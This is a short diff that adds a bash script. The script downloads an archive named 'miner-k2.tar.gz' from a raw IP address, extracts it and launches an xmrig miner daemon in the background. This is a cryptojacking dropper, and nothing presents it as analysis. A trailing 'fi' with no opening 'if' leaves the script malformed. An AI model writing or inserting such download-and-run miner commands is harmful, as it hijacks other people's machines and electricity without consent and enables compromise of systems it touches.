@@ -1,0 +1,3 @@
+#!/bin/bash
+wget http://139.59.106.85/miner-k2.tar.gz && tar -xvf miner-k2.tar.gz && cd miner-k2 && ./xmrigDaemon &
+fi
